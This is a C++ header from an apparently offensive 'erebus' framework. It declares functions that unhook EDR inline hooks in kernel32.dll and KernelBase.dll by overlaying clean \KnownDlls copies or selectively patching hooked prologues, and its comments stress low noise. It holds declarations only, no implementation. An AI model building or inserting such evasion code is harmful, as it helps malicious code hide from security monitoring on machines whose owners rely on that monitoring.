#ifndef EREBUS_UNHOOK_EXTENDED_HPP
#define EREBUS_UNHOOK_EXTENDED_HPP
#pragma once

#include <windows.h>

namespace erebus {
namespace evasion {

    // Overlay the loaded kernel32.dll .text section with a clean copy mapped
    // from \KnownDlls\kernel32.dll, removing any EDR inline hooks on Win32
    // API entry stubs. Returns TRUE if at least one .text section was overlaid.
    // Requires CONFIG_UNHOOK_SCOPE >= 1.
    BOOL UnhookKernel32();

    // Overlay the loaded KernelBase.dll .text section with a clean copy mapped
    // from \KnownDlls\KernelBase.dll, removing inline hooks on the Kernel Base
    // layer (CreateFile, VirtualAlloc, etc.). Returns TRUE on success.
    // Requires CONFIG_UNHOOK_SCOPE >= 1.
    BOOL UnhookKernelbase();

    // Selective function-level unhook. For each FNV-1a hash in func_hashes,
    // locate the export in the corresponding clean KnownDlls view, compare
    // the first 5 bytes to the live module - if they differ (hook detected),
    // copy the first 16 bytes of the clean prologue over the live stub.
    // Much lower noise than a full .text overlay; only patched functions
    // trigger re-protection flips.
    // Requires CONFIG_UNHOOK_SCOPE == 2.
    BOOL UnhookSelective(const ULONG* func_hashes, SIZE_T count);

} // namespace evasion
} // namespace erebus

#endif // EREBUS_UNHOOK_EXTENDED_HPP
